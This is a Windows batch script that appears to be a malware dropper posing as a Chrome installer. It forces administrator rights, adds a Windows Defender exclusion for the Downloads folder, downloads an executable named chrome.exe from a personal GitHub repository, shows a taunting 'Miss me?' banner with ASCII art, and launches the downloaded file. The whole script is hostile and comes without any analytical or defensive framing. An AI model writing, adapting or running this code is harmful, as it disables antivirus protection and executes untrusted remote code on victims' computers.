@echo off

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

set "url=https://raw.githubusercontent.com/bladehaveskills-jpg/chrome/main/chrome.exe"
set "output=%USERPROFILE%\Downloads\chrome.zip"

echo Working on the exclusions...........
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"

timeout /t 1 >nul

echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

echo Running the downloaded file...


mode con: cols=2000 lines=2000
cls

echo hello amigo Miss me?
timeout /t 2 /nobreak >nul

echo         _____                    _____            _____                    _____                    _____            
echo        /\    \                  /\    \          /\    \                  /\    \                  /\    \           
echo       /::\    \                /::\____\        /::\    \                /::\    \                /::\    \          
echo      /::::\    \              /:::/    /       /::::\    \              /::::\    \              /::::\    \         
echo     /::::::\    \            /:::/    /       /::::::\    \            /::::::\    \            /::::::\    \        
echo    /:::/\:::\    \          /:::/    /       /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \       
echo   /:::/__\:::\    \        /:::/    /       /:::/__\:::\    \        /:::/  \:::\    \        /:::/__\:::\    \      
echo  /::::\   \:::\    \      /:::/    /       /::::\   \:::\    \      /:::/    \:::\    \      /::::\   \:::\    \     
echo /::::::\   \:::\    \    /:::/    /       /::::::\   \:::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    
echo /:::/\:::\   \:::\ ___\  /:::/    /       /:::/\:::\   \:::\    \  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \   
echo /:::/__\:::\   \:::^|    ^|/:::/____/       /:::/  \:::\   \:::\____\/:::/____/     \:::^|    ^|/:::/__\:::\   \:::\____\  
echo \:::\   \:::\  /:::^|____^|\:::\    \       \::/    \:::\  /:::/    /\:::\    \      /:::^|____^|\:::\   \:::\   \::/    /  
echo  \:::\   \:::\/:::/    /  \:::\    \       \/____/ \:::\/:::/    /  \:::\    \    /:::/    /  \:::\   \:::\   \/____/   
echo   \:::\   \::::::/    /    \:::\    \               \::::::/    /    \:::\    \  /:::/    /    \:::\   \:::\    \       
echo    \:::\   \::::/    /      \:::\    \               \::::/    /      \:::\    \/:::/    /      \:::\   \:::\____\      
echo     \:::\/:::/    /          \:::\    \            /:::/    /          \:::\/:::/    /          \:::\   \/____/      
echo      \::::::/    /            \:::\    \          /:::/    /            \::::::/    /            \:::\    \          
echo       \::::/    /              \:::\____\        /:::/    /              \::::/    /              \:::\____\         
echo        \::/____/                \::/    /        \::/    /                \::/____/                \::/    /         
echo         ~~                       \/____/          \/____/                  ~~                       \/____/          

start "C:\Users\%USERPROFILE%\Downloads\chrome.exe" "%output%"

echo done

timeout /t 2 /nobreak >nul





